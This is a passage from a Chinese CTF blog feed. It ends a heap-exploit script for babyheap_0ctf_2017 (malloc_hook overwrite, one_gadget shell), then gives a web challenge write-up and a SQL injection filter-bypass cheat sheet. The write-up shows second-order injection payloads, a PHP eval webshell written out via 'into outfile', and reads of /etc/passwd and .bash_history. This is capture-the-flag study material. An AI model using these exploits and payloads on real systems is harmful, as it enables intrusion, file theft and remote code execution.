class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> base,malloc_hook</span><br><span class="line">pay=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="string">'3'</span>,pay)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</span><br><span class="line">print(addr)</span><br><span class="line">base=addr<span class="number">-0x3c4b78</span></span><br><span class="line">malloc_hook=base+<span class="number">0x3c4b10</span></span><br><span class="line">log.info(<span class="string">"libc_base: "</span>+hex(base))</span><br><span class="line">log.info(<span class="string">"malloc_hook:"</span>+hex(malloc_hook))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">fill(<span class="string">'2'</span>,p64(malloc_hook<span class="number">-0x30</span>+<span class="number">0xd</span>))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#fake</span></span><br><span class="line">one=base+<span class="number">0x4526a</span> <span class="comment">#one_gadget</span></span><br><span class="line">fill(<span class="string">'6'</span>,p8(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">fast()</span><br><span class="line">leak()</span><br><span class="line">pwn()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在查阅众多资料后，虽然通过one_gadget做出babyheap_0ctf_2017了，但也算是勉强摸到fastbin及堆的门道（吧？）前途漫漫，关于堆上如何自己写shell还待学习。关于修改<code>__realloc_hook</code>和<code>__free_hook</code>来调用shell的方法须了解。还有更多的堆漏洞还要复习。</p><h2 id="参看文献"><a href="#参看文献" class="headerlink" title="参看文献"></a>参看文献</h2><p><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/</a></p><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html</a></p><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.10_pwn_0ctf2017_babyheap2017.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.10_pwn_0ctf2017_babyheap2017.html</a></p><p>《CTF 竞赛权威指南 pwn篇》</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2018-Comment  复现笔记</title>
      <link href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>在家无聊在buu刷到2018网鼎杯的Comment，发现有好几个点正好是的我目前比较薄弱的故写文以记之.<a id="more"></a></p><h2 id="0x01过程步骤"><a href="#0x01过程步骤" class="headerlink" title="0x01过程步骤"></a>0x01过程步骤</h2><p>、进入题目，发现是一个帖子论坛网站。发现有疑似sql注入的注入点。但是测试后没有发现明显的利用点，就没有什么思绪。尝试访问几个常见文件或目录名，发现有git泄露。</p><p><img src="image-20210215220051579.png" alt="image-20210215220051579"></p><p>用githack获得源文件。</p><p><img src="image-20210215222444037.png" alt="image-20210215222444037"></p><p>经过审计发现有疑似，二次注入的可能。</p><p><img src="image-20210215222731749.png" alt="image-20210215222731749"></p><p>由于addslashes会将一些符号转义但是在sql转义的符号在储存后与addslashes前并没有什么改变（换句话说<code>\&#39;</code>在存入sql后，读取出来仍会是<code>&#39;</code>）。所有我们可以写入数据，再通过这一特性将<code>&#39;</code>逃逸出来，即二次注入。</p><p>因此我们可以构造paylaod：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#39;,(select database()),x&#x3D;1&#x2F;*</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>但是这题有个坑的地方，审计源码+测试发现只有 content 字段我们才能利用。</p><p>所有完整payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一包（write.php）</span><br><span class="line">title&#x3D;2&amp;category&#x3D;a&#39;,content&#x3D;(select database()),&#x2F;*&amp;content&#x3D;111</span><br><span class="line">第二包（comment.php）</span><br><span class="line">content&#x3D;*&#x2F;#</span><br></pre></td></tr></table></figure><p>这样导致：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'$category'</span>,</span><br><span class="line">                <span class="keyword">content</span> = <span class="string">'$content'</span>,</span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span><span class="string">"</span></span><br></pre></td></tr></table></figure><p>当$category为<code>a&#39;,content=(select database()),/*</code></p><p>$content为<code>*/#</code>时</p><p>sql语句就变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'`a'</span>,<span class="keyword">content</span>=(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="comment">/*`',</span></span><br><span class="line"><span class="comment">                content = '*/</span><span class="string">',</span></span><br><span class="line"><span class="string">                bo_id = '</span>$bo_id<span class="string">'"</span></span><br></pre></td></tr></table></figure><p>从而产生注入。</p><p><img src="image-20210215233502014.png" alt="image-20210215233502014"></p><p>但通过注入数据库并未得到什么有效信息。所以猜测是否是写入shell或读取文件。</p><p>本想通过<code>select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/a.php&quot;</code>写入shell但未能成功。于是同过load_file函数来读取文件。</p><p>然后又一个问题来了读取什么文件?</p><p>我们尝试读取<code>flag.php</code>、<code>flag.txt</code>、<code>/flag</code>但是发现并未有flag标识。</p><p>思路一下就短路了，在查阅了资料后了解到<code>.bash_history</code>存放了当前用户历史执行命令。但这个文件在当前用户的目录下。因此我们先要读取<code>/etc/pass</code>获取当前用户信息。</p><p><img src="image-20210216000155737.png" alt="image-20210216000155737"></p><p><img src="image-20210216000223139.png" alt="image-20210216000223139"></p><p>然后这里有个小知识点一般下www用户是在web服务部署时专门设置来管理web的用户。</p><p>读取www用户下的<code>.bash_history</code>即访问路径<code>/home/www/.bash_history</code>。</p><p><img src="image-20210216000257110.png" alt="image-20210216000257110"></p><p>看到linux执行过的命令：</p><p>1。跳转到tmp目录</p><p>2。用unzip解压 html.zip ，这时会产生一个html的文件夹</p><p>3。rm 删除了html.zip </p><p>4。cp 将html 文件夹拷贝在 /var/www 目录下</p><p>5。跳转到 /var/html 目录下</p><p>6。删除了<code>.DS_Store</code>文件</p><p>7。启动 web服务</p><p>发现在<code>/var/www/html</code>下的<code>.DS_Store</code>被删除，但是<code>/tmp</code>下的<code>.DS_Store</code>未被删除。读取发现是2进制文件且带有很多<code>\00</code>字符因此用hex转16进制读取。</p><p><img src="image-20210215231823859.png" alt="image-20210215231823859"></p><p>再用winhex读取</p><p><img src="image-20210216110435524.png" alt="image-20210216110435524"></p><p>发现flag_8946e1ff1ee3e40f.php文件。</p><p>在/tmp/html下读取发现是假flag。</p><p>在/var/www/html/下读取到真正flag</p><p><img src="image-20210216000357240.png" alt="image-20210216000357240"></p><h2 id="0x02考点总结"><a href="#0x02考点总结" class="headerlink" title="0x02考点总结"></a>0x02考点总结</h2><h3 id="1-文件泄露"><a href="#1-文件泄露" class="headerlink" title="1.文件泄露"></a>1.文件泄露</h3><p>在本题中考察的是<code>.git</code>文件泄露，我们可以利用githack脚本来恢复历史版本和下载git文件。</p><p>ps：git log -all 恢复历史文件。</p><h3 id="2-sql二次注入"><a href="#2-sql二次注入" class="headerlink" title="2.sql二次注入"></a>2.sql二次注入</h3><p>在本题中，服务器端只对用传来的数据进行了过滤。sql内部的数据为进行过滤。加之<code>\&#39;</code>在存入sql后，读取出来仍会是<code>&#39;</code>。这样<code>‘</code>就逃逸出来。</p><h3 id="3-sql文件读取"><a href="#3-sql文件读取" class="headerlink" title="3.sql文件读取"></a>3.sql文件读取</h3><p>我们可以同过user()来查看当前用户名，若有读权限那么可以通过load_file函数来读取文件。</p><p>同时lunix 下又很多敏感文件，比如：<code>.bash_history</code>存放了历史执行命令、/etc/passwd存放了用户信息、/etc/shadow存放用户密码且一般情况下不可读的。</p><h3 id="4-linux-命令细节"><a href="#4-linux-命令细节" class="headerlink" title="4.linux 命令细节"></a>4.linux 命令细节</h3><p>在本题中考了写linux命令的细节，如cp会保留原文件，unzip 解压时默认在当前路径下生成解压出来的文件。</p><h3 id="5-hexwin-分析hex数据"><a href="#5-hexwin-分析hex数据" class="headerlink" title="5.hexwin 分析hex数据"></a>5.hexwin 分析hex数据</h3><p>我们可以将数据转为16进制再通过hexwin写入文件还原从而获得一些内容特别的文件或数据。</p><h2 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h2><p><a href="https://www.jb51.net/article/108979.htm" target="_blank" rel="noopener">https://www.jb51.net/article/108979.htm</a></p><p><a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167089.html</a></p><p><a href="https://blog.csdn.net/qq_41628669/article/details/106133104" target="_blank" rel="noopener">https://blog.csdn.net/qq_41628669/article/details/106133104</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> Linux </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于sql注入bypass总结</title>
      <link href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/"/>
      <url>/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>最近，在比赛发现之前整理sql注入的笔记有点乱，有bypass姿势有点不好找。于是写了篇文章来整理下。</p><a id="more"></a><h2 id="中间件过滤绕过"><a href="#中间件过滤绕过" class="headerlink" title="中间件过滤绕过"></a>中间件过滤绕过</h2><p>1.大小写绕过</p><p>2.双写绕过</p><p>3.编码绕过</p><p>4.字符替换绕过</p><h2 id="方法替换绕过"><a href="#方法替换绕过" class="headerlink" title="方法替换绕过"></a>方法替换绕过</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>1.在纯mysql下，我们可以用<code>/**/</code>来代替空格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;**&#x2F;database();</span><br></pre></td></tr></table></figure><p><img src="image-20210131205441717.png" alt="image-20210131205441717"></p><p>2.我们还可以用<code>+</code>来代替空格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select+database();</span><br></pre></td></tr></table></figure><p><img src="image-20210131211724609.png" alt="image-20210131211724609"></p><p>3.在有php中间件下，我们用<code>%09</code>、<code>%0A</code>、 <code>%0B</code>、 <code>%0C</code>、 <code>%0D</code>、<code>%A0</code>、<code>%20</code>这些url字符来绕过空格。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>%<span class="number">09</span><span class="keyword">database</span>();</span><br></pre></td></tr></table></figure><p>4.<code>and/or</code>后面可以跟上偶数个<code>!</code>、<code>~</code>可以替代空格，也可以混合使用(规律又不同)，<code>and/or</code>前的空格可用省略.</p><p>5.用<code>()</code>来传递参数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="keyword">union</span>(<span class="keyword">select</span>+title,<span class="keyword">content</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/*!article*/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="string">'1'</span><span class="keyword">and</span>!!!!~~<span class="number">1</span>=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>6.对于字符串参数可以利用 引号和反引号还传递参数。</p><p>7.由于<code>&lt;&gt;</code> 等价于 <code>!=</code>,我们可以再加一个<code>!</code>来构成<code>=</code>的效果.</p><p><img src="image-20210201164131405.png" alt="image-20210201164131405"></p><p>8.符号、字母与数字间的空格可以适当省略。</p><p><img src="image-20210201112258586.png" alt="image-20210201112258586"></p><h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>在sql中，注释符有：两种单行注释符和多行注释。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#， </span></span><br><span class="line"><span class="comment">-- X(X为任意字符)</span></span><br><span class="line"><span class="comment">/*(MySQL-5.1)</span></span><br><span class="line"><span class="comment">;%00</span></span><br><span class="line"><span class="comment">`</span></span><br><span class="line"><span class="comment">'or 1=1;%00</span></span><br><span class="line"><span class="comment">'or 1=1 union select 1,2`'</span></span><br><span class="line"><span class="comment">'or 1=1 # </span></span><br><span class="line"><span class="comment">'/*!50000or*/</span> 1=1 <span class="comment">-- -      //版本号为5.1.38时只要小于50138</span></span><br><span class="line">'<span class="comment">/*!or*/</span> 1=1 <span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>若<code>#</code> 、<code>-</code>同时被ban。可以使用逻辑符与引号转字符串绕过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>||<span class="string">'x</span></span><br><span class="line"><span class="string">#这样  x 所在的位置及以后的内容就变成字符串，加上 `||` 作用就起了等同于注释的作用</span></span><br></pre></td></tr></table></figure><h3 id="数字与大写字母绕过"><a href="#数字与大写字母绕过" class="headerlink" title="数字与大写字母绕过"></a>数字与大写字母绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K</span><br><span class="line">true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L</span><br><span class="line">true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M</span><br><span class="line">floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N</span><br><span class="line">ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O</span><br><span class="line">floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P</span><br><span class="line">ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q</span><br><span class="line">ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R</span><br><span class="line">floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S</span><br><span class="line">floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T</span><br></pre></td></tr></table></figure><h3 id="等号绕过"><a href="#等号绕过" class="headerlink" title="等号绕过"></a>等号绕过</h3><p>我们可以用LIKE 替代。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id =  'USER'</span><br><span class="line">id LIKE 'USER'</span><br></pre></td></tr></table></figure><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><p>在对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="comment">#等效于</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>() ,<span class="number">1</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="image-20210201113138887.png" alt="image-20210201113138887"></p><p>在对于limit可以使用offset来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> books  <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">#等效于</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> books  <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="image-20210201113747738.png" alt="image-20210201113747738"></p><p>在对于select可以使用jion来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b;</span><br><span class="line"> <span class="comment">#等效于</span></span><br><span class="line"> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p><img src="image-20210201113531721.png" alt="image-20210201113531721"></p><h3 id="大于小于符号绕过"><a href="#大于小于符号绕过" class="headerlink" title="大于小于符号绕过"></a>大于小于符号绕过</h3><h4 id="greatest-amp-amp-least"><a href="#greatest-amp-amp-least" class="headerlink" title="greatest&amp;&amp;least"></a>greatest&amp;&amp;least</h4><p>我们可以用<code>greatest()</code> 与<code>least()</code> 。</p><p> <code>greatest(a,b)</code>返回a与b中较大的那个值。</p><p><img src="image-20210201115111398.png" alt="image-20210201115111398"></p><p> <code>least(a,b)</code>返回a与b中较小的那个值。</p><p><img src="image-20210201115204131.png" alt="image-20210201115204131"></p><p>因此一个盲注sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span>;</span><br></pre></td></tr></table></figure><p>可以替代成为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h4><p>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1.</p><p><img src="image-20210201165236647.png" alt="image-20210201165236647"></p><h4 id="in关键字"><a href="#in关键字" class="headerlink" title="in关键字"></a>in关键字</h4><p>in关键字可以用来判断前一字符串中是否有某一字符.</p><p><img src="image-20210201171432062.png" alt="image-20210201171432062"></p><h4 id="between-a-and-b"><a href="#between-a-and-b" class="headerlink" title="between a and b"></a>between a and b</h4><p>between a and b 来判断范围是否在a-b之间</p><p><img src="image-20210201171912552.png" alt="image-20210201171912552"></p><h3 id="逻辑符号与关键词替代绕过"><a href="#逻辑符号与关键词替代绕过" class="headerlink" title="逻辑符号与关键词替代绕过"></a>逻辑符号与关键词替代绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在sql中：</span><br><span class="line">and等效&amp;&amp;  </span><br><span class="line">or等效||   </span><br><span class="line">xor等效|   </span><br><span class="line">not等效!</span><br></pre></td></tr></table></figure><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><h4 id="使用十六进制"><a href="#使用十六进制" class="headerlink" title="使用十六进制"></a>使用十六进制</h4><p><img src="image-20210201123229303.png" alt="image-20210201123229303"></p><h4 id="用宽字节绕过"><a href="#用宽字节绕过" class="headerlink" title="用宽字节绕过"></a>用宽字节绕过</h4><p>当我们输入的数据为：<code>username=%df%27or%201=1%23&amp;password=123</code></p><p>经过addslashes函数处理最终变成：<code>username=%df%5c%27or%201=1%23&amp;password=123</code></p><p>经过gbk解码得到<code>：username=運&#39;or 1=1#、password=123</code>，拼接到SQL语句得：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'運'</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#' and password='123';</span></span><br></pre></td></tr></table></figure><p>从而绕过引号.</p><h3 id="sleep绕过"><a href="#sleep绕过" class="headerlink" title="sleep绕过"></a>sleep绕过</h3><h3 id="报错注入函数替代"><a href="#报错注入函数替代" class="headerlink" title="报错注入函数替代"></a>报错注入函数替代</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>payload：<code>exp(~(select * from(select user())a))</code></p><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>payload：<code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>payload：<code>(extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h4 id="rand-group-count"><a href="#rand-group-count" class="headerlink" title="rand()+group()+count()"></a>rand()+group()+count()</h4><p>payload：<code>select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><h4 id="GeometryCollection"><a href="#GeometryCollection" class="headerlink" title="GeometryCollection"></a>GeometryCollection</h4><p>payload：<code>GeometryCollection((select * from (select* from(select user())a)b))</code></p><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h4><p>payload：<code>polygon((select * from(select * from(select user())a)b))</code></p><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint"></a>multipoint</h4><p>payload：<code>multipoint((select * from(select * from(select user())a)b))</code></p><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring"></a>multilinestring</h4><p>payload：<code>multilinestring((select * from(select * from(select user())a)b))</code></p><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring"></a>linestring</h4><p>payload：<code>LINESTRING((select * from(select * from(select user())a)b))</code></p><h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon"></a>multipolygon</h4><p>payload：<code>multipolygon((select * from(select * from(select user())a)b))</code></p><h3 id="函数时延"><a href="#函数时延" class="headerlink" title="函数时延"></a>函数时延</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><p>payload:<code>select 1,3 and sleep(1)</code></p><h4 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h4><p> MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。<br>参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式.</p><p><code>benchmark(time,fun)</code></p><h3 id="字符串截取替代"><a href="#字符串截取替代" class="headerlink" title="字符串截取替代"></a>字符串截取替代</h3><h4 id="SUBSTR"><a href="#SUBSTR" class="headerlink" title="SUBSTR"></a>SUBSTR</h4><p>substr（data，statr，len）</p><p><img src="image-20210201184708338.png" alt="image-20210201184708338"></p><h4 id="SUBSTRING"><a href="#SUBSTRING" class="headerlink" title="SUBSTRING"></a>SUBSTRING</h4><p>substring（data，statr，len）</p><p><img src="image-20210201184758057.png" alt="image-20210201184758057"></p><p>还有多种模式：<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)。</code></p><h4 id="RIGHT"><a href="#RIGHT" class="headerlink" title="RIGHT"></a>RIGHT</h4><p>RIGHT(str,len)，对指定字符串从最右边截取指定长度。</p><p><img src="image-20210201190835425.png" alt="image-20210201190835425"></p><h4 id="LEFT"><a href="#LEFT" class="headerlink" title="LEFT"></a>LEFT</h4><p>LEFT(str,len)，对指定字符串从最左边截取指定长度。</p><p><img src="image-20210201190937713.png" alt="image-20210201190937713"></p><h4 id="RPAD"><a href="#RPAD" class="headerlink" title="RPAD"></a>RPAD</h4><p>RPAD(str,len,padstr)，在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。</p><p><img src="image-20210201191659765.png" alt="image-20210201191659765"></p><h4 id="LPAD"><a href="#LPAD" class="headerlink" title="LPAD"></a>LPAD</h4><p>LPAD(str,len,padstr)，与RPAD相似，在str左边补齐。</p><p><img src="image-20210201191809029.png" alt="image-20210201191809029"></p><h4 id="MID"><a href="#MID" class="headerlink" title="MID"></a>MID</h4><p>mid(str,pos,len)同于 SUBSTRING。</p><p><img src="image-20210201192553328.png" alt="image-20210201192553328"></p><h4 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT"></a>CONCAT</h4><p>concat(str1,str2…)，函数用于将多个字符串合并为一个字符串。</p><h4 id="GROUP-CONCAT"><a href="#GROUP-CONCAT" class="headerlink" title="GROUP_CONCAT"></a>GROUP_CONCAT</h4><p>返回一个字符串结果，该结果由分组中的值连接组合而成。</p><h4 id="MAKE-SET"><a href="#MAKE-SET" class="headerlink" title="MAKE_SET"></a>MAKE_SET</h4><p>MAKE_SET(bits,str1,str2,…)根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</p><h2 id="其他特性"><a href="#其他特性" class="headerlink" title="其他特性"></a>其他特性</h2><h3 id="注释逃逸"><a href="#注释逃逸" class="headerlink" title="注释逃逸"></a>注释逃逸</h3><p><code>/* */</code> 在mysql中是多行注释,但是如果里面加了! 那么后面的内容会被执行.</p><p>正常的sql语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">NAME</span> <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>();</span><br></pre></td></tr></table></figure><p>效果如下:<img src="image-20210131195902194.png" alt="image-20210131195902194"></p><p>含有<code>/*! 